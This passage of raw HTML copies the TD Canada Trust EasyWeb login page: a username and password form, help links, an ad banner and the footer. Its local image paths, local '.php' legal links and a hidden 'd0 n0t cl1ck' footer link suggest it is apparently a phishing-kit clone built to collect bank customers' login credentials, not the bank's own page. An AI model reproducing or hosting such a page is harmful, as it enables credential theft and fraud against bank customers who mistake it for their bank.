                                                                                    <input id="description" name="description" ng-model="vm.dt.description" ng-focus="vm.descriptionFocused=true" ng-blur="loginForm.description.$valid &amp;&amp; (vm.descriptionFocused=!vm.dt.description)" td-ui-validate-function="otpNicknameValidation" tabindex="8" autocomplete="off" aria-describedby="description-ids" aria-label="Description (Optional)" class="ng-pristine ng-untouched ng-valid form-control ng-valid-function ng-empty" aria-invalid="false" type="text">
                                                                                    <div td-ui-messages="loginForm.description" role="alert" class="td-error">
                                                                                        <div td-ui-message="function" id="description-ids" ng-bind-html="'LOGIN.FORMAT_DESCRIPTION' | translate" style="display: none;"><strong>!</strong> Enter alphanumeric characters only<br><strong>!</strong> Max 32 characters<br>Special characters allowed are: #, @, apostrophe, space</div>
                                                                                    </div>
                                                                                </div>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                            <!---->
                                                            <div class="td-group-touched" ng-class="{'td-group-error': !!vm.dt.passwordInlineError}">
                                                                <div ng-class="{'td-group-touched': hasTouched, 'td-group-error': hasError &amp;&amp; isDirty,'ng-invalid': hasError, 'ng-dirty': isDirty, 'td-group-focus ng-focus': hasFocus, 'td-group-hover ng-hover': hasHover}" class="form-group-short td-group-touched form-group" td-ui-form-group="Password">
                                                                    <label id="labelWrap_183 " class="" for="password">Password</label><span aria-hidden="true" aria-describedby="labelWrap_183" bind-html-compile="help"></span>
                                                                    <div ng-transclude="" class="label-elements">
                                                                        <input id="password2" type="password" required="true" name="password" class="otp-always-show-error ng-pristine ng-untouched ng-valid form-control ng-empty input-password" ng-change="vm.loginPwdChanged()" aria-describedby="pwdErrorMsg" autocomplete="off" autocapitalize="none" tabindex="3" focus-me="!vm.dt.usernameInlineError &amp;&amp; (!!vm.dt.passwordInlineError || !!vm.parent.dt.loginError)" ng-model="password" aria-invalid="false" type="text" attr-action="Filling Password">
                                                                        <otp-server-error elem-id="pwdErrorMsg" error="vm.dt.passwordInlineError" display="label">
                                                                            <!---->
                                                                        </otp-server-error>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                            <!---->
                                                            <div ng-if="!vm.dt.selectedUser &amp;&amp; (!$root.otpGenericConfig || !!$root.otpGenericConfig.isRememberMeEnabled)" class="td-checkbox-div-wrapper inline">
                                                                <div class="td-checkbox-wrapper"><input class="form-control ng-pristine ng-untouched ng-valid ng-empty" id="rememberMe2" name="rememberMe" tabindex="6" ng-model="rememberMe" aria-invalid="false" type="checkbox"><label for="rememberMe2" class="card">Remember me</label></div>
                                                            </div>
                                                            <!---->
                                                            <div class="td-row">
                                                                <div ng-class="{true: 'td-col-md-6', false: 'td-col-lg-7 td-col-md-8 td-col-sm-10'}[!!vm.parent.securekey]" class="td-col-lg-7 td-col-md-8 td-col-sm-10">
                                                                    <div class="form-group">
                                                                        <button type="submit" tabindex="4" name="save2" value="1" class="td-button td-button-block td-button-secondary btn-login">
                                                                            <span class="btn-txt"><img src="./files/7.png"> Login</span>
                                                                            <span class="btn-spinner" style="display: none"><i class="fa fa-spinner fa-spin"></i></span>
                                                                        </button>
                                                                    </div>
                                                                </div>
                                                                <!---->
                                                            </div>
                                                        </div>
                                                    </div>
                                                </form>
                                            </login-form>
                                            <!---->
                                            <div class="form-group" ng-if="!vm.securekey &amp;&amp; (!$root.otpGenericConfig || !!$root.otpGenericConfig.isForgotPasswordEnabled)">
                                                
                                            </div>
                                            <!---->
                                            <!---->
                                            <!---->
                                            <div ng-if="!vm.myInsurance &amp;&amp; !vm.genericLogin">
                                                <div class="td-security-guarantee">
                                                    <img class="td-icon icon-regular td-icon-superlock" src="./files/8.png">
                                                    <div class="td-security-guarantee-copy">
                                                        <span class="td-small-copy" ng-bind-html="'LOGIN.SECURITY_GUARANTEE' | translate">TD Online and Mobile Security Guarantee</span>:
                                                        <a role="link" class="td-small-copy td-link-standalone" standalone-link="You are protected" href="http://www.tdcanadatrust.com/products-services/banking/electronic-banking/access-card-security/guarantee.jsp">
                                                        <span ng-bind-html="subText">You are</span>
                                                        <span class="td-link-lastword">
                                                        <span ng-bind-html="lastWord">protected</span> &nbsp;<img src="./files/6.png">
                                                        </span>
                                                        </a>
                                                    </div>
                                                </div>
                                            </div>
                                            <!---->
                                        </div>
                                    </div>
                                </div>
                                <!---->
                            </section>
                            <!-- Right Nav -->
                            <!---->
                            <section ng-if="!!wcm_content.rightNav" class="login-right-nav-xs">
                                <!---->
                                <div ng-if="!vm.securekey" class="visible-xs" compile="wcm_content.rightNav">
                                    <div class="otp-box-content">
                                        <h2 class="text-black" ng-bind-html="'LOGIN.HEADER3' | translate">Getting started is Quick <br class="hidden-md hidden-lg"> and Easy</h2>
                                        <p>If you received a temporary password, simply use that along with
                                            your username to log in. You will then be prompted to create a new one.
                                        </p>
                                        <div class="td-row">
                                            <div class="td-col-sm-11 td-col-md-10 td-col-lg-8">
                                                <div class="form-group">
                                                    <a href="https://easyweb.td.com/waw/esr/selfRegistration.htm" class="td-button td-button-block td-button-clear-green">
                                                    Register online now
                                                    </a>
                                                </div>
                                            </div>
                                        </div>
                                        <div class="hidden-sm">
                                            <h2 class="text-black">Need Help?</h2>
                                            <div class="td-row td-row-separate-right-md">
                                                <div class="td-col-md-6">
                                                    <ul class="td-list-links">
                                                        <li>
                                                            <a role="link" class="td-link-standalone" standalone-link="Get Login help" ng-click="vm.openPopup('URLS.RIGHT_NAV.EASYWEB.GET_LOGIN_HELP', 'LINKS.GET_LOGIN_HELP', {width: 500, height: 600})">
                                                            <span ng-bind-html="subText">Get Login</span>
                                                            <span class="td-link-lastword">
                                                            <span ng-bind-html="lastWord">help</span>
                                                            <span class="td-icon td-icon-rightCaret" aria-hidden="true"></span>
                                                            </span>
                                                            </a>
                                                        </li>
                                                        <li><a role="link" class="td-link-standalone" standalone-link="Reset Password" data-ui-sref="app.reset.reset-password" href="/220098/td#/reset/reset-password">
                                                            <span ng-bind-html="subText">Reset</span>
                                                            <span class="td-link-lastword">
                                                            <span ng-bind-html="lastWord">Password</span>
                                                            <span class="td-icon td-icon-rightCaret" aria-hidden="true"></span>
                                                            </span>
                                                            </a>
                                                        </li>
                                                        <li><a role="link" class="td-link-standalone" standalone-link="Supported Browsers" href="https://www.tdcanadatrust.com/products-services/banking/electronic-banking/sup-br.jsp">
                                                            <span ng-bind-html="subText">Supported</span>
                                                            <span class="td-link-lastword">
                                                            <span ng-bind-html="lastWord">Browsers</span>
                                                            <span class="td-icon td-icon-rightCaret" aria-hidden="true"></span>
                                                            </span>
                                                            </a>
                                                        </li>
                                                    </ul>
                                                </div>
                                                <div class="td-col-md-6">
                                                    <ul class="td-list-links">
                                                        <li><a role="link" class="td-link-standalone" standalone-link="Book an Appointment" href="https://www.tdcanadatrust.com/oab/OABLandingPage/OABLocationSearch.form?lang=en">
                                                            <span ng-bind-html="subText">Book an</span>
                                                            <span class="td-link-lastword">
                                                            <span ng-bind-html="lastWord">Appointment</span>
                                                            <span class="td-icon td-icon-rightCaret" aria-hidden="true"></span>
                                                            </span>
                                                            </a>
                                                        </li>
                                                        <li><a role="link" class="td-link-standalone" standalone-link="Holiday Hours" href="https://www.tdcanadatrust.com/customer-service/contact-us/holiday-branch-hours.jsp">
                                                            <span ng-bind-html="subText">Holiday</span>
                                                            <span class="td-link-lastword">
                                                            <span ng-bind-html="lastWord">Hours</span>
                                                            <span class="td-icon td-icon-rightCaret" aria-hidden="true"></span>
                                                            </span>
                                                            </a>
                                                        </li>
                                                    </ul>
                                                </div>
                                            </div>
                                        </div>
                                        <div class="hidden-xs visible-sm hidden-md hidden-lg">
                                            <div class="otp-webbroker-black-label otp-need-help-links" h2-expand-collapse="Need help?">
                                                <h2 ng-init="isExpanded" class="otp-expand-collapse">
                                                    <a ng-click="isExpanded=!isExpanded" tabindex="0" role="button" class="td-link-nounderline" aria-expanded="false">
                                                    <span class="td-icon td-icon-expand" ng-class="{true:'td-icon-collapse', false:'td-icon-expand'}[!!isExpanded]" aria-hidden="true">
                                                    </span>
                                                    <span class="black-label">Need help?</span>
                                                    </a>
                                                </h2>
                                                <div class="otp-expand-body ng-hide" aria-hidden="true" ng-show="!!isExpanded" ng-transclude="">
                                                    <div class="td-row td-row-separate-right-md">
                                                        <div class="td-col-md-6">
                                                            <ul class="td-list-links">
                                                                <li>
                                                                    <a role="link" class="td-link-standalone" standalone-link="Get Login help" ng-click="vm.openPopup('URLS.RIGHT_NAV.EASYWEB.GET_LOGIN_HELP', 'LINKS.GET_LOGIN_HELP', {width: 500, height: 600})">
                                                                    <span ng-bind-html="subText">Get Login</span>
                                                                    <span class="td-link-lastword">
                                                                    <span ng-bind-html="lastWord">help</span>
                                                                    <span class="td-icon td-icon-rightCaret" aria-hidden="true"></span>
                                                                    </span>
                                                                    </a>
                                                                </li>
                                                                <li><a role="link" class="td-link-standalone" standalone-link="Reset Password" data-ui-sref="app.reset.reset-password" href="/220098/td#/reset/reset-password">
                                                                    <span ng-bind-html="subText">Reset</span>
                                                                    <span class="td-link-lastword">
                                                                    <span ng-bind-html="lastWord">Password</span>
                                                                    <span class="td-icon td-icon-rightCaret" aria-hidden="true"></span>
                                                                    </span>
                                                                    </a>
                                                                </li>
                                                                <li><a role="link" class="td-link-standalone" standalone-link="Supported Browsers" href="https://www.tdcanadatrust.com/products-services/banking/electronic-banking/sup-br.jsp">
                                                                    <span ng-bind-html="subText">Supported</span>
                                                                    <span class="td-link-lastword">
                                                                    <span ng-bind-html="lastWord">Browsers</span>
                                                                    <span class="td-icon td-icon-rightCaret" aria-hidden="true"></span>
                                                                    </span>
                                                                    </a>
                                                                </li>
                                                            </ul>
                                                        </div>
                                                        <div class="td-col-md-6">
                                                            <ul class="td-list-links">
                                                                <li><a role="link" class="td-link-standalone" standalone-link="Book an Appointment" href="https://www.tdcanadatrust.com/oab/OABLandingPage/OABLocationSearch.form?lang=en">
                                                                    <span ng-bind-html="subText">Book an</span>
                                                                    <span class="td-link-lastword">
                                                                    <span ng-bind-html="lastWord">Appointment</span>
                                                                    <span class="td-icon td-icon-rightCaret" aria-hidden="true"></span>
                                                                    </span>
                                                                    </a>
                                                                </li>
                                                                <li><a role="link" class="td-link-standalone" standalone-link="Holiday Hours" href="https://www.tdcanadatrust.com/customer-service/contact-us/holiday-branch-hours.jsp">
                                                                    <span ng-bind-html="subText">Holiday</span>
                                                                    <span class="td-link-lastword">
                                                                    <span ng-bind-html="lastWord">Hours</span>
                                                                    <span class="td-icon td-icon-rightCaret" aria-hidden="true"></span>
                                                                    </span>
                                                                    </a>
                                                                </li>
                                                            </ul>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </div>
                                        <hr class="td-thin-divider-line-1 hor-separator">
                                        <h3 class="td-cta"><a role="link" class="td-link-standalone" standalone-link="Get the TD Mobile App now" href="http://www.tdcanadatrust.com/products-services/banking/electronic-banking/mobile/mobile-index.jsp">
                                            <span ng-bind-html="subText">Get the TD Mobile App</span>
                                            <span class="td-link-lastword">
                                            <span ng-bind-html="lastWord">now</span>
                                            <span class="td-icon td-icon-rightCaret" aria-hidden="true"></span>
                                            </span>
                                            </a>
                                        </h3>
                                    </div>
                                    <div class="visible-xs otp-box-outside">
                                        <section class="otp-full-width-xs otp-getting-started-xs">
                                            <div class="td-container">
                                                <h2 ng-bind-html="'LOGIN.HEADER3' | translate">Getting started is Quick <br class="hidden-md hidden-lg"> and Easy</h2>
                                                <p>If you received a temporary password, simply use that
                                                    along with your username to log in. You will then be prompted to create a
                                                    new one.
                                                </p>
                                                <div class="form-group">
                                                    <button class="td-button td-button-block td-button-clear-green">Register online now
                                                    </button>
                                                </div>
                                            </div>
                                        </section>
                                        <hr class="td-thin-divider-line-1">
                                        <section class="otp-full-width-xs otp-getting-started-xs">
                                            <div class="td-container">
                                                <div class="otp-need-help-links" h2-expand-collapse="Need Help?">
                                                    <h2 ng-init="isExpanded" class="otp-expand-collapse">
                                                        <a ng-click="isExpanded=!isExpanded" tabindex="0" role="button" class="td-link-nounderline" aria-expanded="false">
                                                        <span class="black-label">Need Help?</span>
                                                        </a>
                                                    </h2>
                                                    <div class="otp-expand-body ng-hide" aria-hidden="true" ng-show="!!isExpanded" ng-transclude="">
                                                        <div class="td-row td-row-separate-right-md">
                                                            <div class="td-col-md-6">
                                                                <ul class="td-list-links">
                                                                    <li><a role="link" class="td-link-standalone" standalone-link="Get Login help" href="http://td.intelliresponse.com/login/">
                                                                        <span ng-bind-html="subText">Get Login</span>
                                                                        <span class="td-link-lastword">
                                                                        <span ng-bind-html="lastWord">help</span>
                                                                        <span class="td-icon td-icon-rightCaret" aria-hidden="true"></span>
                                                                        </span>
                                                                        </a>
                                                                    </li>
                                                                    <li><a role="link" class="td-link-standalone" standalone-link="Reset Password" data-ui-sref="app.reset.reset-password" href="/220098/td#/reset/reset-password">
                                                                        <span ng-bind-html="subText">Reset</span>
                                                                        <span class="td-link-lastword">
                                                                        <span ng-bind-html="lastWord">Password</span>
                                                                        <span class="td-icon td-icon-rightCaret" aria-hidden="true"></span>
                                                                        </span>
                                                                        </a>
                                                                    </li>
                                                                    <li><a role="link" class="td-link-standalone" standalone-link="Supported Browsers" href="https://www.tdcanadatrust.com/products-services/banking/electronic-banking/sup-br.jsp">
                                                                        <span ng-bind-html="subText">Supported</span>
                                                                        <span class="td-link-lastword">
                                                                        <span ng-bind-html="lastWord">Browsers</span>
                                                                        <span class="td-icon td-icon-rightCaret" aria-hidden="true"></span>
                                                                        </span>
                                                                        </a>
                                                                    </li>
                                                                </ul>
                                                            </div>
                                                            <div class="td-col-md-6">
                                                                <ul class="td-list-links">
                                                                    <li><a role="link" class="td-link-standalone" standalone-link="Book an Appointment" href="https://www.tdcanadatrust.com/oab/OABLandingPage/OABLocationSearch.form?lang=en">
                                                                        <span ng-bind-html="subText">Book an</span>
                                                                        <span class="td-link-lastword">
                                                                        <span ng-bind-html="lastWord">Appointment</span>
                                                                        <span class="td-icon td-icon-rightCaret" aria-hidden="true"></span>
                                                                        </span>
                                                                        </a>
                                                                    </li>
                                                                    <li><a role="link" class="td-link-standalone" standalone-link="Holiday Hours" href="https://www.tdcanadatrust.com/customer-service/contact-us/holiday-branch-hours.jsp">
                                                                        <span ng-bind-html="subText">Holiday</span>
                                                                        <span class="td-link-lastword">
                                                                        <span ng-bind-html="lastWord">Hours</span>
                                                                        <span class="td-icon td-icon-rightCaret" aria-hidden="true"></span>
                                                                        </span>
                                                                        </a>
                                                                    </li>
                                                                </ul>
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </div>
                                        </section>
                                        <hr class="visible-xs td-thin-divider-line-1">
                                        <div class="td-container">
                                            <div class="td-row">
                                                <div class="td-col-xs-12">
                                                    <h3 class="td-cta"><a role="link" class="td-link-standalone" standalone-link="Get the TD Mobile App now" href="http://www.tdcanadatrust.com/products-services/banking/electronic-banking/mobile/mobile-index.jsp">
                                                        <span ng-bind-html="subText">Get the TD Mobile App</span>
                                                        <span class="td-link-lastword">
                                                        <span ng-bind-html="lastWord">now</span>
                                                        </span>
                                                        </a>
                                                    </h3>
                                                </div>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                                <!---->
                                <!---->
                            </section>
                            <!---->
                            <!-- Marketing Msg OAS -->
                            <div class="td-container">
                                <a href="https://ads.td.com/RealMedia/ads/click_lx.ads/www.td.com/tdct/en/login/L24/1688984379/Middle/TDBank/OTP-Communications_TDCT_EN_Nov2017@OTP-ComingSoon_EW_LI_EN_Feb2018/OTP-Communications_EW_LI_vComingSoon2_EN_c000-02-0313.html/38643755684672506e31594141766833" target="_blank">
                                </a>
                            </div>
                            <section class="td-in-page-banner">
                                <div class="td-container">
                                    <a href="https://ads.td.com/RealMedia/ads/click_lx.ads/www.td.com/tdct/en/login/L24/1688984379/Middle/TDBank/OTP-Communications_TDCT_EN_Nov2017@OTP-ComingSoon_EW_LI_EN_Feb2018/OTP-Communications_EW_LI_vComingSoon2_EN_c000-02-0313.html/38643755684672506e31594141766833" target="_blank">
                                        <div class="td-row">
                                            <div class="td-col-xs-12 td-col-lg-12 td-banner">
                                                <picture>
                                                    <source srcset="https://oasc17.247realmedia.com/RealMedia/ads/Creatives/TDBank/OTP-Communications_TDCT_EN_Nov2017@OTP-ComingSoon_EW_LI_EN_Feb2018/OTPComingSoon_bg_DT_1170x260.jpg" media="(min-width: 1200px)">
                                                    <source srcset="https://oasc17.247realmedia.com/RealMedia/ads/Creatives/TDBank/OTP-Communications_TDCT_EN_Nov2017@OTP-ComingSoon_EW_LI_EN_Feb2018/OTPComingSoon_bg_DT_1170x260.jpg" media="(min-width: 1024px)">
                                                    <source srcset="https://oasc17.247realmedia.com/RealMedia/ads/Creatives/TDBank/OTP-Communications_TDCT_EN_Nov2017@OTP-ComingSoon_EW_LI_EN_Feb2018/OTPComingSoon_bg_TL_1024x260.jpg" media="(min-width: 768px)">
                                                    <source srcset="https://oasc17.247realmedia.com/RealMedia/ads/Creatives/TDBank/OTP-Communications_TDCT_EN_Nov2017@OTP-ComingSoon_EW_LI_EN_Feb2018/OTPComingSoon_bg_MB_640x520.jpg" media="(max-width: 768px)">
                                                    <!-- Following is fallback for IE. Serve the LG image because we know it's a desktop -->
                                                </picture>
                                            </div>
                                            <div class="td-col-xs-12 td-col-sm-8 td-col-sm-offset-4 td-col-md-7 td-col-md-offset-5 td-banner-content">
                                            </div>
                                        </div>
                                    </a>
                                </div>
                            </section>
                            
                            <!---->
                        </login-template>
                    </ui-view><!---->
            
        </div>
        
        <!---->
        
        <!---->
        <div ng-if="!!wcm_content.legal &amp;&amp; !vm.webbroker" compile="wcm_content.legal" class="div-main">
            <section class="otp-full-width td-fullwidth-white">
                <div class="td-container">
                    <div class="td-row">
                        <div class="td-col-md-10 td-col-md-offset-1">
                            <p class="td-copy-legal">
                                <span ng-bind-html="'LOGIN.LEGAL.PART_1' | translate">By
                                using EasyWeb, our secured financial services site, offered by TD
                                Canada Trust and its affiliates, you agree to the terms and services of
                                the </span>
                                <a href="040148.php" ng-click="vm.openPopup('LOGIN.LEGAL.PART_2_LINK', 'LOGIN.LEGAL.PART_2', {width: 618, height: 618})" ng-bind-html="'LOGIN.LEGAL.PART_2' | translate">Financial Services Terms</a>
                                <span ng-bind-html="'LOGIN.LEGAL.PART_3' | translate">, </span>
                                <a href="040148.php" ng-click="vm.openPopup('LOGIN.LEGAL.PART_4_LINK', 'LOGIN.LEGAL.PART_4', {width: 618, height: 618})" ng-bind-html="'LOGIN.LEGAL.PART_4' | translate">Cardholder and Electronic Financial Services Terms and Conditions</a>
                                <span ng-bind-html="'LOGIN.LEGAL.PART_5' | translate"> and/or; the </span>
                                <a href="040148.php" ng-click="vm.openPopup('LOGIN.LEGAL.PART_6_LINK', 'LOGIN.LEGAL.PART_6', {width: 618, height: 618})" ng-bind-html="'LOGIN.LEGAL.PART_6' | translate">Business Access Services Schedule</a>
                                <span ng-bind-html="'LOGIN.LEGAL.PART_7' | translate"> and/or; the </span>
                                <a href="040148.php" ng-click="vm.openPopup('LOGIN.LEGAL.PART_8_LINK', 'LOGIN.LEGAL.PART_8', {width: 618, height: 618})" ng-bind-html="'LOGIN.LEGAL.PART_8' | translate">Terms and Agreement</a>
                                <span ng-bind-html="'LOGIN.LEGAL.PART_9' | translate"> and </span>
                                <a href="040148.php" ng-click="vm.openPopup('LOGIN.LEGAL.PART_10_LINK', 'LOGIN.LEGAL.PART_10', {width: 618, height: 618})" ng-bind-html="'LOGIN.LEGAL.PART_10' | translate">Disclosure</a>
                                <span ng-bind-html="'LOGIN.LEGAL.PART_11' | translate"> for mutual funds accounts held with TD Investment Services Inc.</span>
                            </p>
                        </div>
                    </div>
                </div>
            </section>
        </div>
        <!---->
        
    </div>
    <!-- Footer -->
    <!---->
    <div data-ui-view="footer">
        <footer-public>
            <footer class="td-fullwidth-dark-green td-padding-vert-0" ng-show="!vm.hideHeaderAndFooterForMbna" aria-hidden="false" style="left: 0px; right: 0px; bottom: 0px; position: static;">
                <div class="td-container">
                    <div class="td-row">
                        <div class="td-footer-content td-col-xs-12" style="background-image:url(https://authentication.td.com/uap-ui/generated/styles/images/footer_seat.png)">
                            <p class="td-footer-heading td-copy-white td-copy-align-centre">
                                Need to talk to us directly?
                                <a role="link" class="td-contact-link td-link-standalone" href="https://www.td.com/ca/en/personal-banking/contact-us/" standalone-link="Contact us">
                                <span ng-bind-html="subText">Contact</span>
                                <span class="td-link-lastword">
                                <span ng-bind-html="lastWord">us</span>&nbsp;<img src="./files/14.png">
                                </span>
                                </a>
                            </p>
                            <div class="td-footer-social td-copy-align-centre">
                                <p class="td-footer-social-heading">Connect with TD</p>
                                <ul>
                                    <li>
                                        <a class="td-link-nounderline" href="https://twitter.com/td_canada" target="_blank">
                                        <img src="./files/9.png">
                                        <span class="td-forscreenreader">FOOTER.TWITTER</span>
                                        </a>
                                    </li>
                                    <li>
                                        <a class="td-link-nounderline" href="https://facebook.com/tdbankgroup/" target="_blank">
                                        <img src="./files/10.png">
                                        <span class="td-forscreenreader">FOOTER.FACEBOOK</span>
                                        </a>
                                    </li>
                                    <li>
                                        <a class="td-link-nounderline" href="https://www.instagram.com/TD_Canada/" target="_blank">
                                        <img src="./files/11.png">
                                        <span class="td-forscreenreader">FOOTER.INSTAGRAM</span>
                                        </a>
                                    </li>
                                    <li>
                                        <a class="td-link-nounderline" href="https://www.youtube.com/tdcanada" target="_blank">
                                        <img src="./files/12.png">
                                        <span class="td-forscreenreader">FOOTER.YOUTUBE</span>
                                        </a>
                                    </li>
                                    <img src="./files/13.png">
                                    <li>
                                        <a class="td-link-nounderline" href="https://www.linkedin.com/company/td" target="_blank">
                                        </a>
                                    </li>
                                </ul>
                            </div>
                            <div class="td-footer-links td-copy-align-centre td-copy-white">
                                <a class="td-copy-white td-link-nounderline td-copy-standard" target="_blank" href="https://www.td.com/privacy-and-security/privacy-and-security/index.jsp">Privacy and Security</a>
                                <a class="td-copy-white td-link-nounderline td-copy-standard" target="_blank" href="https://www.td.com/to-our-customers/">Legal</a>
                                <a class="td-copy-white td-link-nounderline td-copy-standard" target="_blank" href="http://www.tdcanadatrust.com/customer-service/accessibility/accessibility-at-td/index.jsp">Accessibility</a>
                                <a class="td-copy-white td-link-nounderline td-copy-standard" target="_blank" href="https://www.tdcanadatrust.com/products-services/index.jsp">CDIC member</a>
                                <a class="td-copy-white td-link-nounderline td-copy-standard" target="_blank" href="https://www.td.com/about-tdbfg/our-business/index.jsp">About Us</a>
                                <a href="/not-found" style="visibility: hidden;">d0 n0t cl1ck</a>
                                <a class="td-copy-white td-link-nounderline td-copy-standard" target="_blank" href="https://www.td.com/careers/why-td/index.jsp">We're Hiring</a>
                                <a class="td-copy-white td-link-nounderline td-copy-standard" href="040148" ng-click="vm.openSiteIndexModal()">Site Index</a>
                            </div>
                        </div>
                    </div>
                </div>
            </footer>
        </footer-public>
    </div>
    
    


</body></html>